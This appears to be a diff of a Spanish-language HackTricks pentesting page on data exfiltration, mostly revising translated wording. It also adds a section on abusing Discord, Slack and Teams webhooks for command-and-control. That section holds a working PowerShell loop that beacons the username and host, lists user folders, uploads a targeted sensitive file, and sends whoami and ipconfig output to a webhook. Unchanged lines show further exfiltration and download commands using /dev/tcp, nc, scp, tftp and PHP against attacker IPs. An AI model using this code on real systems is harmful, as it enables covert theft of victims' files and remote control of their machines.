@@ -1,12 +1,12 @@
-# Exfiltración
+# Exfiltration
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Dominios comúnmente en la lista blanca para exfiltrar información
+## Commonly whitelisted domains to exfiltrate information
 
-Consulta [https://lots-project.com/](https://lots-project.com/) para encontrar dominios comúnmente en la lista blanca que pueden ser abusados
+Consulta [https://lots-project.com/](https://lots-project.com/) para encontrar commonly whitelisted domains que pueden ser abusados
 
-## Copiar\&Pegar Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -45,8 +45,8 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Subir archivos
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer imprimiendo GET y POSTs (también encabezados)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Módulo de Python [uploadserver](https://pypi.org/project/uploadserver/):
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Módulo Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -100,6 +100,91 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) para C2 & Data Exfiltration
+
+Webhooks son endpoints HTTPS de solo escritura que aceptan JSON y partes de archivo opcionales. Suelen permitirse en dominios SaaS de confianza y no requieren OAuth/API keys, lo que los hace útiles para beaconing y exfiltration de baja fricción.
+
+Key ideas:
+- Endpoint: Discord usa https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data con una parte llamada payload_json que contiene {"content":"..."} y parte(s) de archivo opcional(es) llamadas file.
+- Patrón de bucle del operador: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirman la entrega.
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+Notas:
+- Patrones similares se aplican a otras plataformas de colaboración (Slack/Teams) que usan sus incoming webhooks; ajuste la URL y el JSON schema según corresponda.
+- Para DFIR de artefactos de caché de Discord Desktop y recuperación de webhook/API, vea:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
 ### Servidor FTP (python)
@@ -107,7 +192,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### Servidor FTP (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -130,7 +215,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Cliente** de Windows
+### **Windows** cliente
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -150,7 +235,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-O crear un recurso compartido smb **usando samba**:
+O crea un smb share **usando samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -175,13 +260,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-El atacante debe tener SSHd en ejecución.
+El attacker debe tener SSHd en ejecución.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Si la víctima tiene SSH, el atacante puede montar un directorio de la víctima al atacante.
+Si la víctima tiene SSH, el atacante puede montar un directorio de la víctima en el sistema del atacante.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -194,7 +279,7 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Descargar archivo de la víctima
+### Descargar archivo desde victim
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -228,15 +313,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si puedes enviar datos a un servidor SMTP, puedes crear un SMTP para recibir los datos con python:
+Si puedes enviar datos a un servidor SMTP, puedes crear un servidor SMTP para recibir los datos con python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Por defecto en XP y 2003 (en otros debe ser agregado explícitamente durante la instalación)
+Por defecto en XP y 2003 (en otros debe añadirse explícitamente durante la instalación)
 
-En Kali, **iniciar servidor TFTP**:
+En Kali, **iniciar TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -254,7 +339,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Descargar un archivo con un PHP oneliner:
+Descargar un archivo con un oneliner PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -296,18 +381,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hex**. Esto significa que al proporcionar un hex de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación de ensamblar archivos de hasta 64 kb de tamaño**.
+El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hex**. Esto significa que, proporcionando un hex de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación: ensamblar archivos de hasta 64 kb de tamaño**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Luego, copia y pega el texto en la ventana de comandos de Windows y se creará un archivo llamado nc.exe.
+Luego copia y pega el texto en el windows-shell y se creará un archivo llamado nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## Referencias
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
